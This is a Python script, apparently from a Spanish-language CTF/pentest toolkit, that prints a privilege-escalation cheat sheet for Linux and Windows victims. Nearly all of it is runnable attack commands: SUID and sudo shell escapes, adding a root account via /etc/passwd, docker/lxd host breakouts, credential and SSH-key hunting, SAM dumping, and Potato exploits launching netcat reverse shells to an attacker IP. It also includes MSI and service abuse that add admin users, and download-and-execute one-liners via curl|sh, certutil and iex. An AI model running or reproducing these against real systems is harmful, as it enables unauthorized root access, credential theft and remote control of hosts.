import sys
import os

class Colors:
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

def _print_section(title):
    print(f"\n{Colors.BOLD}{'─'*55}{Colors.ENDC}")
    print(f"{Colors.WARNING}  ★ {title}{Colors.ENDC}")
    print(f"{Colors.BOLD}{'─'*55}{Colors.ENDC}\n")

def _cmd(c):
    sys.stdout.buffer.write(f"    {Colors.OKGREEN}{c}{Colors.ENDC}\n".encode('utf-8'))
    sys.stdout.buffer.flush()

def _tip(c):
    print(f"    {Colors.OKCYAN}# {c}{Colors.ENDC}")

def _warn(c):
    print(f"    {Colors.WARNING}[!] {c}{Colors.ENDC}")

# ══════════════════════════════════════════════════════
#  LINUX
# ══════════════════════════════════════════════════════

def linux_privesc():
    print(f"{Colors.FAIL}  ⚡ QUICK WINS — Probá PRIMERO estos{Colors.ENDC}\n")

    quick_wins = [
        ("sudo -l", "Si hay NOPASSWD busca en GTFOBins: https://gtfobins.github.io/"),
        ("id", "Grupos peligrosos: docker, lxd, disk, adm, shadow, video, staff"),
        ("find / -perm -4000 -type f 2>/dev/null | xargs ls -la", "Buscar SUID — clave para escalar sin creds"),
        ("getcap -r / 2>/dev/null", "Capabilities — a menudo cap_setuid+ep = root inmediato"),
        ("cat /etc/crontab; ls -la /etc/cron.*; crontab -l 2>/dev/null", "Cron jobs — scripts modificables = escalar"),
    ]
    for cmd, tip in quick_wins:
        _cmd(cmd)
        _tip(tip)
        print()

    _print_section("SUID — GTFOBins Comunes en CTFs")
    suid_bins = [
        ("find", "find . -exec /bin/sh -p \\; -quit"),
        ("vim/vi", "vim -c ':!/bin/sh'"),
        ("nmap", "nmap --interactive → !sh  (versiones viejas)"),
        ("python/python3", "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"),
        ("bash", "bash -p"),
        ("cp", "cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p"),
        ("less/more", "less /etc/passwd → !/bin/sh"),
        ("awk", "awk 'BEGIN {system(\"/bin/sh\")}'"),
        ("env", "env /bin/sh -p"),
        ("perl", "perl -e 'exec \"/bin/sh\";'"),
        ("php", "php -r 'pcntl_exec(\"/bin/sh\");'"),
        ("ruby", "ruby -e 'exec \"/bin/sh\"'"),
        ("lua", "lua -e 'os.execute(\"/bin/sh\")'"),
        ("tee", "echo 'root3:$(openssl passwd hack123):0:0:root:/root:/bin/bash' | tee -a /etc/passwd"),
        ("dd", "dd if=/bin/sh of=/tmp/sh && chmod +s /tmp/sh && /tmp/sh -p"),
    ]
    for bin_name, exploit in suid_bins:
        print(f"  {Colors.WARNING}[{bin_name}]{Colors.ENDC}")
        _cmd(exploit)
        print()

    _print_section("SUDO — Explotar binarios con sudo")
    sudo_abuses = [
        ("sudo vim", "sudo vim -c ':!/bin/bash'"),
        ("sudo awk", "sudo awk 'BEGIN {system(\"/bin/bash\")}'"),
        ("sudo less", "sudo less /etc/passwd → !/bin/bash"),
        ("sudo python3", "sudo python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"),
        ("sudo env", "sudo env /bin/bash"),
        ("sudo tar", "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash"),
        ("sudo zip", "sudo zip /tmp/x /etc/hosts -T --unzip-command='sh -c /bin/bash'"),
        ("sudo curl", "sudo curl file:///etc/shadow"),
        ("sudo journalctl", "sudo journalctl → !/bin/bash"),
        ("sudo man", "sudo man man → !/bin/bash"),
        ("sudo nano", "sudo nano /etc/sudoers  →  agregar: ALL=(ALL) NOPASSWD: ALL"),
        ("sudo find", "sudo find / -exec /bin/bash \\; -quit"),
    ]
    for bin_name, exploit in sudo_abuses:
        print(f"  {Colors.WARNING}[{bin_name}]{Colors.ENDC}")
        _cmd(exploit)
        print()

    _print_section("Grupos Peligrosos")
    groups = [
        ("docker", [
            "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
            "docker images  # Ver imágenes disponibles",
        ]),
        ("lxd/lxc", [
            "# 1. En Kali: git clone https://github.com/saghul/lxd-alpine-builder && ./build-alpine",
            "# 2. Subir alpine.tar.gz a la víctima",
            "lxc image import ./alpine.tar.gz --alias myimage",
            "lxc init myimage ignite -c security.privileged=true",
            "lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true",
            "lxc start ignite && lxc exec ignite /bin/sh",
            "# Ahora tenés /mnt/root → /root del host",
        ]),
        ("disk", [
            "debugfs /dev/sda1  # Acceso directo al filesystem como root",
            "debugfs -w /dev/sda1 -R 'cat /etc/shadow'",
        ]),
        ("adm", [
            "cat /var/log/auth.log  # Logs de autenticación",
            "grep -i 'password\\|failed\\|accept' /var/log/auth.log",
        ]),
        ("shadow", [
            "cat /etc/shadow  # Leer hashes directamente",
            "python Farei_0x.py hashes /etc/shadow",
        ]),
    ]
    for group, cmds in groups:
        print(f"  {Colors.FAIL}[Grupo: {group}]{Colors.ENDC}")
        for cmd in cmds:
            if cmd.startswith("#"):
                _tip(cmd[2:])
            else:
                _cmd(cmd)
        print()

    _print_section("Cron Jobs — Path Hijacking y Wildcards")
    _tip("Si un cron ejecuta un script que podés modificar → ponés reverse shell adentro")
    _cmd("cat /etc/crontab; ls -la /var/spool/cron/crontabs/")
    _cmd("pspy64  # Ver procesos en tiempo real — detecta crons sin ser root")
    print(f"\n  {Colors.WARNING}[Wildcard Injection en tar]{Colors.ENDC}")
    _tip("Si el cron hace: tar czf backup.tar.gz /var/www/*")
    _cmd("echo '' > '--checkpoint=1'")
    _cmd("echo '' > '--checkpoint-action=exec=sh shell.sh'")
    _cmd("echo 'chmod +s /bin/bash' > shell.sh")
    print(f"\n  {Colors.WARNING}[Path Hijacking]{Colors.ENDC}")
    _tip("Si el script llama a un comando sin ruta absoluta (ej: 'python' en vez de '/usr/bin/python')")
    _cmd("export PATH=/tmp:$PATH && echo '/bin/bash' > /tmp/python && chmod +x /tmp/python")
    print()

    _print_section("Contraseñas — Hunting en el Filesystem")
    hunting_cmds = [
        "grep -rn 'password\\|passwd\\|secret\\|credential\\|api_key\\|token' /home /var/www /opt /etc 2>/dev/null | grep -v Binary | grep -v '.pyc' | head -50",
        "find / -name '*.conf' -o -name '*.config' -o -name '*.ini' -o -name '.env' 2>/dev/null | xargs grep -l 'pass' 2>/dev/null",
        "find / -name 'id_rsa' -o -name 'id_ed25519' -o -name '*.pem' -o -name '*.key' 2>/dev/null",
        "cat ~/.bash_history ~/.zsh_history 2>/dev/null | grep -i 'pass\\|ssh\\|curl\\|wget'",
        "find / -name 'wp-config.php' -o -name 'config.php' -o -name 'database.yml' 2>/dev/null",
        "find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null",
    ]
    for cmd in hunting_cmds:
        _cmd(cmd)
    print()

    _print_section("Servicios Locales — Puertos Internos")
    _tip("A veces hay servicios solo accesibles desde localhost que no aparecen en el recon externo")
    _cmd("ss -tlnp")
    _cmd("netstat -tlnp 2>/dev/null")
    _cmd("ps aux | grep -v '\\[' | sort -k 1 | head -30")
    _tip("Si hay algo en 127.0.0.1:XXXX → port forward con SSH o chisel")
    _cmd("ssh -L 8888:127.0.0.1:PUERTO user@VICTIM_IP  # SSH local port forward")
    print()

    _print_section("Kernel Exploits")
    _cmd("uname -a && cat /etc/os-release")
    _cmd("uname -r  # Versión del kernel")
    _tip("Buscar en: https://github.com/mzet-/linux-exploit-suggester")
    _cmd("./linux-exploit-suggester.sh")
    print(f"  {Colors.WARNING}[Dirty COW — CVE-2016-5195]{Colors.ENDC} (kernel < 4.8.3)")
    print(f"  {Colors.WARNING}[PwnKit — CVE-2021-4034]{Colors.ENDC} (pkexec — casi cualquier Linux)")
    print(f"  {Colors.WARNING}[DirtyPipe — CVE-2022-0847]{Colors.ENDC} (kernel 5.8 → 5.16.11)")
    _cmd("python Farei_0x.py cve 'pkexec CVE-2021-4034'")
    print()

    _print_section("AutoEnumeración — LinPEAS (Imprescindible)")
    _cmd("curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh 2>/dev/null | tee /tmp/linpeas.txt")
    _cmd("# Si no hay curl: wget http://TU_IP/linpeas.sh && bash linpeas.sh | tee /tmp/linpeas.txt")
    _tip("Buscar líneas en ROJO/AMARILLO — son los hallazgos críticos")
    print()

# ══════════════════════════════════════════════════════
#  WINDOWS
# ══════════════════════════════════════════════════════

def windows_privesc():
    print(f"{Colors.FAIL}  ⚡ QUICK WINS — Probá PRIMERO estos{Colors.ENDC}\n")
    quick_wins = [
        ("whoami /all", "Ver todos los privilegios — buscar SeImpersonatePrivilege, SeBackupPrivilege"),
        ("cmdkey /list", "Credenciales guardadas en el sistema"),
        ('reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon"', "AutoLogon credentials"),
        ("systeminfo | findstr /B /C:'OS Name' /C:'OS Version' /C:'System Type'", "Info del OS para buscar kernel exploits"),
    ]
    for cmd, tip in quick_wins:
        _cmd(cmd)
        _tip(tip)
        print()

    _print_section("SeImpersonatePrivilege — Potato Attacks")
    _tip("Si 'whoami /priv' muestra SeImpersonatePrivilege: Enabled → usá una de estas")
    potatoes = [
        ("PrintSpoofer (Windows 10/Server 2019)", [
            ".\\PrintSpoofer.exe -i -c cmd",
            ".\\PrintSpoofer.exe -c 'nc.exe TU_IP 4444 -e cmd'",
        ]),
        ("GodPotato (más universal)", [
            ".\\GodPotato.exe -cmd 'cmd /c whoami'",
            ".\\GodPotato.exe -cmd 'nc.exe TU_IP 4444 -e cmd.exe'",
        ]),
        ("JuicyPotato (Windows < 10/Server < 2019)", [
            ".\\JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t * -c '{CLSID}'",
        ]),
        ("RoguePotato", [
            ".\\RoguePotato.exe -r TU_IP -e 'nc.exe TU_IP 4444 -e cmd.exe' -l 9999",
        ]),
    ]
    for name, cmds in potatoes:
        print(f"  {Colors.WARNING}[{name}]{Colors.ENDC}")
        for cmd in cmds:
            _cmd(cmd)
        print()

    _print_section("SeBackupPrivilege — Leer SAM/NTDS.dit")
    _tip("Si tenés SeBackupPrivilege → podés leer cualquier archivo incluyendo SAM")
    _cmd("reg save HKLM\\SAM C:\\Temp\\SAM")
    _cmd("reg save HKLM\\SYSTEM C:\\Temp\\SYSTEM")
    _cmd("reg save HKLM\\SECURITY C:\\Temp\\SECURITY")
    _tip("Descargar y en Kali:")
    _cmd("impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL")
    _cmd("python Farei_0x.py hashes secretsdump_output.txt")
    print()

    _print_section("AlwaysInstallElevated — MSI como SYSTEM")
    _cmd('reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated')
    _cmd('reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated')
    _tip("Si AMBAS son 0x1:")
    _cmd("msfvenom -p windows/exec CMD='net user hacker Pass123! /add && net localgroup administrators hacker /add' -f msi > evil.msi")
    _cmd("msiexec /quiet /qn /i evil.msi")
    print()

    _print_section("Unquoted Service Path")
    _cmd('wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\\\windows\\\\" | findstr /i /v """"')
    _tip("Si hay una ruta con espacios sin comillas → plantar exe en la ruta")
    _cmd("icacls 'C:\\Program Files\\Vulnerable Service\\'  # Verificar permisos de escritura")
    _cmd("# Subir payload como: C:\\Program.exe o C:\\Program Files\\Vulnerable.exe")
    print()

    _print_section("Credenciales — Hunting en Windows")
    hunting = [
        'findstr /si "password" *.txt *.xml *.ini *.config *.bak 2>nul',
        'reg query HKLM /f password /t REG_SZ /s 2>nul | findstr /i "password"',
        'dir /s /b *pass* *cred* *vnc* *.config 2>nul',
        "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt",
        "cmdkey /list",
        'reg query "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions" /s 2>nul',
    ]
    for cmd in hunting:
        _cmd(cmd)
    print()

    _print_section("Tareas Programadas")
    _cmd("schtasks /query /fo LIST /v | findstr /i 'TaskName\\|Run As User\\|Task To Run\\|Status'")
    _tip("Si la tarea corre como SYSTEM y ejecuta un script modificable → reverse shell ahí")
    print()

    _print_section("Servicios — Permisos Débiles")
    _cmd("# Requiere accesschk.exe de Sysinternals:")
    _cmd(".\\accesschk.exe -uwcqv * /accepteula 2>nul")
    _cmd("sc qc NOMBRE_SERVICIO")
    _cmd("sc config NOMBRE_SERVICIO binpath= 'cmd /c net user hacker Pass123! /add'")
    _cmd("sc stop NOMBRE_SERVICIO && sc start NOMBRE_SERVICIO")
    print()

    _print_section("PrintNightmare / CVE-2021-34527")
    _cmd('sc query spooler | findstr "STATE"')
    _tip("Si está RUNNING:")
    _cmd("python Farei_0x.py cve 'CVE-2021-34527'")
    print()

    _print_section("AutoEnumeración — WinPEAS")
    _cmd("certutil -urlcache -split -f http://TU_IP/winPEAS.exe .\\winPEAS.exe && .\\winPEAS.exe")
    _cmd("# O PowerShell:")
    _cmd("iex (New-Object Net.WebClient).DownloadString('http://TU_IP/winPEAS.ps1')")
    _tip("Buscar secciones en ROJO — son los hallazgos críticos")
    print()

# ══════════════════════════════════════════════════════
#  Entry Point
# ══════════════════════════════════════════════════════

def run(os_type="linux"):
    print(f"{Colors.BOLD}{'='*55}{Colors.ENDC}")
    print(f"{Colors.FAIL}  💀 PRIVESC v2.0 — OBSIDIAN TIER{Colors.ENDC}")
    print(f"{Colors.BOLD}{'='*55}{Colors.ENDC}")

    if os_type.lower() == "linux":
        print(f"\n{Colors.OKCYAN}[*] MODO: Linux Post-Exploitation{Colors.ENDC}")
        print(f"{Colors.OKCYAN}[*] Ejecutá estos dentro de la shell de la víctima{Colors.ENDC}\n")
        linux_privesc()
        print(f"{Colors.OKCYAN}[*] Recursos:{Colors.ENDC}")
        print(f"    GTFOBins: https://gtfobins.github.io/")
        print(f"    LinPEAS:  https://github.com/peass-ng/PEASS-ng")
        print(f"    HackTricks Linux: https://book.hacktricks.xyz/linux-hardening/privilege-escalation")
    elif os_type.lower() == "windows":
        print(f"\n{Colors.OKCYAN}[*] MODO: Windows Post-Exploitation{Colors.ENDC}")
        print(f"{Colors.OKCYAN}[*] Ejecutá estos dentro de la shell de la víctima{Colors.ENDC}\n")
        windows_privesc()
        print(f"{Colors.OKCYAN}[*] Recursos:{Colors.ENDC}")
        print(f"    LOLBAS:   https://lolbas-project.github.io/")
        print(f"    WinPEAS:  https://github.com/peass-ng/PEASS-ng")
        print(f"    HackTricks Windows: https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation")
    else:
        print(f"{Colors.FAIL}[-] OS no reconocido. Usá: --os linux  o  --os windows{Colors.ENDC}")
        return

    print(f"\n{Colors.BOLD}{'='*55}{Colors.ENDC}")
